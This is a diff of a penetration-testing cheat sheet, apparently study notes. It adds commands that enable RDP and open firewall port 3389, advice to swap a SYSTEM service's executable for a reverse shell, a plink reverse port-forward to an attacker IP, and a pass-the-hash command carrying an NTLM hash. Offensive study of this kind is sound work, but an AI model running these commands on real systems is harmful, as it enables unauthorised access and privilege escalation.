@@ -105,10 +105,14 @@ __MSRPC (135)__
 * Stuff
 
 
+__MySQL (3306)__
+
+
+
 __RDP (3389)__
 
-If you have credentials, you can enable the RDP service:
-```
+If you have credentials, you can enable the RDP service then log in:
+```powershell
 # METHOD 1
 $ netsh firewall set service RemoteDesktop enable
 
@@ -121,24 +125,20 @@ $ reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSCon
 # METHOD 4
 $ sc config TermService start= auto
 $ net start Termservice
-$ netsh.exe
+$ netsh.exe firewall add portopening TCP 3389 "Remote Desktop"
 
-# 
-firewall
-add portopening TCP 3389 "Remote Desktop"
-OR: 
+# METHOD 5
 netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
 program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
-Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
+Remote Desktop service to allow RDP traffic. [TCP 3389]" enable=yes 
 profile=private,domain localport=3389 protocol=tcp
+
+# METHOD 6
 netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
 program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
-Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
+Remote Desktop service to allow RDP traffic. [UDP 3389]" enable=yes 
 profile=private,domain localport=3389 protocol=udp
 ```
-
-
-
 
 
 ## WEB
@@ -254,6 +254,21 @@ UDEV
 * Exploit Code: https://www.exploit-db.com/exploits/8478
 
 __WINDOWS PRIVESC__
+
+!! If a service is running as SYSTEM, you can try to replace the executable with a reverse shell exe !!
+* Requires restarting service for system to rerun as your exe.
+* Restarting might simply mean you have to access the service directly
+    * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
+    
+Nestat:
+* `netstat`: see what ports are on LISTENING state, but not pubicly accessible from the outside.
+* There's often a SQL server/tomcat/smb/samba running, but not public facing.
+* You can port-forward back to your machine and hit them with public exploits for root shell.
+* E.g.:
+```powershell
+$ plink.exe -l root 10.11.0.42 -R 445:127.0.0.1:445      // forward target local p445 -> attacker p445
+$ pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE // run cmd.exe
+```
 
 Accesschk.exe:
 * http://www.fuzzysecurity.com/tutorials/16.html
